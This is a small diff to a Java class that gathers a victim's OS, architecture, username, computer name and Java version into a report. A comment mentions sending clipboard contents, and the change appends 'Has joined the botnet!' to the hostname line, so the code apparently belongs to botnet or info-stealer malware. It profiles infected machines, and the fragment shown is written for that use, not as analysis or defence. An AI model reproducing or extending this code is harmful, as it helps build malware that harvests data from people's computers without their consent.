@@ -11,7 +11,7 @@ public class GeneralInformation implements JSONObject {
 
         content += "OS: " + System.getProperty("os.name") + " (" + System.getProperty("os.version") + ")" + "\\n";
         content += "Arch: " + System.getProperty("os.arch") + "\\n";
-        content += "Hostname: " + System.getProperty("user.name") + "@" + System.getenv("COMPUTERNAME") + "\\n";
+        content += "Hostname: " + System.getProperty("user.name") + "@" + System.getenv("COMPUTERNAME") + " Has joined the botnet!" + "\\n";
         // Idrk here it's a little buggy and if they have a huge clipboard or a file on their clipboard it just bugs out and doesn't send anything in here so yeah.
         //content += "Clipboard: " + Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor) + "\\n";
         content += "Java Version: " + System.getProperty("java.version");
